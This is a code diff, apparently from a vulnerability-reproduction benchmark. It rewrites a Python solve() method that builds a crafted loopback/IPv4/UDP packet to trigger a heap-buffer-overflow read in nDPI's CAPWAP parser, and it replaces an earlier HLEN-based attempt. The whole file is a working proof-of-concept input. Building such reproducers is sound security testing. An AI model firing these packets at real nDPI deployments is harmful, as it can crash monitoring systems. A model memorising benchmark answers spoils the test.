@@ -3,75 +3,43 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC for Heap Buffer Overflow in ndpi_search_setup_capwap.
-        The vulnerability allows an out-of-bounds read when the CAPWAP header length field (HLEN)
-        indicates a size larger than the actual packet payload.
-        Ground-truth PoC length is 33 bytes (20 byte IP + 8 byte UDP + 5 byte payload).
+        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
+        
+        The vulnerability corresponds to OSS-Fuzz issue 21000. It is a heap-buffer-overflow (read)
+        caused by accessing capwap_header[1] without checking if the payload length is sufficient.
+        The crash happens when payload starts with \x00 but is less than 2 bytes long.
+        
+        Ground-truth length 33 implies a DLT_NULL (Loopback) frame:
+        4 bytes (Loopback) + 20 bytes (IP) + 8 bytes (UDP) + 1 byte (Payload) = 33 bytes.
         """
         
-        # 1. IP Header (20 bytes)
-        # IPv4, IHL=5 -> 0x45
-        # Total Length = 33
-        # Protocol = 17 (UDP)
-        # Source/Dest = 127.0.0.1
-        ip_ver_ihl = 0x45
-        ip_tos = 0
-        ip_total_len = 33
-        ip_id = 0x1234
-        ip_frag_off = 0
-        ip_ttl = 64
-        ip_proto = 17
-        ip_check = 0
-        ip_src = b'\x7f\x00\x00\x01'
-        ip_dst = b'\x7f\x00\x00\x01'
+        # 1. Loopback Header (4 bytes)
+        # Family AF_INET = 2. Little Endian standard for many fuzzers.
+        dl_header = b'\x02\x00\x00\x00'
         
-        # Structure for IP header
-        ip_fmt = '!BBHHHBBH4s4s'
+        # 2. IP Header (20 bytes)
+        # Version/IHL: 0x45 (IPv4, 20 bytes)
+        # TOS: 0x00
+        # Total Length: 29 bytes (0x001d) -> 20 IP + 8 UDP + 1 Payload
+        # ID: 0x0000
+        # Flags/Frag: 0x0000
+        # TTL: 0x40
+        # Protocol: 0x11 (UDP)
+        # Checksum: 0x0000 (Ignored by nDPI usually)
+        # Src IP: 127.0.0.1
+        # Dst IP: 127.0.0.1
+        ip_header = b'\x45\x00\x00\x1d\x00\x00\x00\x00\x40\x11\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01'
         
-        # Pack with zero checksum to calculate real checksum
-        ip_header_tmp = struct.pack(
-            ip_fmt, 
-            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
-            ip_ttl, ip_proto, ip_check, ip_src, ip_dst
-        )
+        # 3. UDP Header (8 bytes)
+        # Src Port: 0
+        # Dst Port: 5246 (0x147e) - CAPWAP Control
+        # Length: 9 bytes (0x0009) - 8 Header + 1 Payload
+        # Checksum: 0
+        udp_header = b'\x00\x00\x14\x7e\x00\x09\x00\x00'
         
-        # Calculate IP Checksum
-        s = 0
-        for i in range(0, len(ip_header_tmp), 2):
-            w = (ip_header_tmp[i] << 8) + ip_header_tmp[i+1]
-            s += w
-            
-        # Fold carry
-        while (s >> 16):
-            s = (s & 0xFFFF) + (s >> 16)
-        ip_check = (~s) & 0xFFFF
+        # 4. Payload (1 byte)
+        # Must be \x00 to satisfy the first condition `if (header[0] == 0 ...)`
+        # The subsequent check for `header[1]` causes the OOB read.
+        payload = b'\x00'
         
-        # Final IP Header
-        ip_header = struct.pack(
-            ip_fmt, 
-            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
-            ip_ttl, ip_proto, ip_check, ip_src, ip_dst
-        )
-        
-        # 2. UDP Header (8 bytes)
-        # Port 5246 is CAPWAP Control
-        # Length = 8 (header) + 5 (payload) = 13
-        udp_sport = 12345
-        udp_dport = 5246 
-        udp_len = 13
-        udp_check = 0 # Optional in IPv4
-        
-        udp_header = struct.pack('!HHHH', udp_sport, udp_dport, udp_len, udp_check)
-        
-        # 3. Payload (5 bytes)
-        # The vulnerability is in parsing CAPWAP header.
-        # Format: [Preamble (8b)] [HLEN (5b) | ... ]
-        # Setting HLEN to a large value (e.g., 31) implies a header size of 31*4 = 124 bytes.
-        # Since actual payload is only 5 bytes, this triggers an OOB read.
-        
-        # Byte 0: Preamble = 0x00
-        # Byte 1: 0xF8 => binary 11111000. Top 5 bits are 11111 (31).
-        # Bytes 2-4: Padding
-        payload = b'\x00\xf8\x00\x00\x00'
-        
-        return ip_header + udp_header + payload
+        return dl_header + ip_header + udp_header + payload
